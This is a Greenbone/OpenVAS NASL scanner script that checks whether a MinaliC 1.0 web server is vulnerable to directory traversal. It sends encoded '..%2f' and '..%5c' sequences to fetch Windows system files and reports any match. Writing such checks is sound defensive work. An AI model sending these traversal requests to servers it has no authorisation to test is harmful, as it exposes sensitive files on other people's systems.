if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100872" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2010-10-26 13:33:58 +0200 (Tue, 26 Oct 2010)" );
	script_bugtraq_id( 44393 );
	script_tag( name: "cvss_base", value: "5.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:N/A:N" );
	script_name( "MinaliC Directory Traversal and Denial of Service Vulnerabilities" );
	script_xref( name: "URL", value: "https://www.securityfocus.com/bid/44393" );
	script_xref( name: "URL", value: "http://sourceforge.net/projects/minalic/" );
	script_xref( name: "URL", value: "http://www.johnleitch.net/Vulnerabilities/MinaliC.Webserver.1.0.Directory.Traversal/53" );
	script_xref( name: "URL", value: "http://www.johnleitch.net/Vulnerabilities/MinaliC.Webserver.1.0.Denial.Of.Service/52" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web application abuses" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc" );
	script_require_ports( "Services/www", 8000 );
	script_mandatory_keys( "minaliC/banner" );
	script_tag( name: "summary", value: "MinaliC is prone to a directory-traversal vulnerability and a denial-of-
  service vulnerability." );
	script_tag( name: "impact", value: "Exploiting these issues will allow attackers to obtain sensitive
  information or cause denial-of-service conditions." );
	script_tag( name: "affected", value: "MinaliC 1.0 is vulnerable. Other versions may also be affected." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
port = http_get_port( default: 8000 );
banner = http_get_remote_headers( port: port );
if(!banner || !ContainsString( banner, "Server: minaliC" )){
	exit( 0 );
}
files = traversal_files( "windows" );
for trav in make_list( crap( data: "..%2f",
	 length: 7 * 5 ),
	 crap( data: "..%5c",
	 length: 7 * 5 ) ) {
	for pattern in keys( files ) {
		file = files[pattern];
		url = NASLString( trav, file );
		if(http_vuln_check( port: port, url: url, pattern: pattern )){
			report = http_report_vuln_url( port: port, url: url );
			security_message( port: port, data: report );
			exit( 0 );
		}
	}
}
exit( 0 );

